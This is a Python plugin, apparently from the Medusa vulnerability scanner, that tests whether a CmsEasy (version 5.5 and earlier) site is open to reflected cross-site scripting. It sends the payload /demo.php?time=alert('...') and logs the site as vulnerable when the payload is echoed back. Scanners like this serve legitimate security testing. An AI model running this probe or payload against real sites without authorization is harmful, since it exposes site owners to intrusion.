#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from ClassCongregation import UrlProcessing,VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,randoms,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "KpLi0rn"  # 插件作者
        self.info['create_date'] = "2020-2-23"  # 插件编辑时间
        self.info['disclosure']='2014-10-21'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CmsEasyCrossSiteScriptingVulnerability"  # 插件名称
        self.info['name'] ='CmsEasy跨站脚本漏洞' #漏洞名称
        self.info['affects'] = "CmsEasy"  # 漏洞组件
        self.info['desc_content'] = "CmsEasy/demo.php文件存在xss漏洞"  # 漏洞描述
        self.info['rank'] = "低危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "<=5.5"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        RD=randoms().result(20)
        payload = "/demo.php?time=alert('{}')".format(RD)
        payload_url = scheme + "://" + url +":"+ str(port) + payload

        resp = requests.get(payload_url,headers=Headers, timeout=6, proxies=proxies, verify=False)
        con = resp.text
        code = resp.status_code
        if code== 200 and con.find("time:alert('{}'),".format(RD)) != -1 :
            Medusa = "{}存在CmsEasy跨站脚本漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类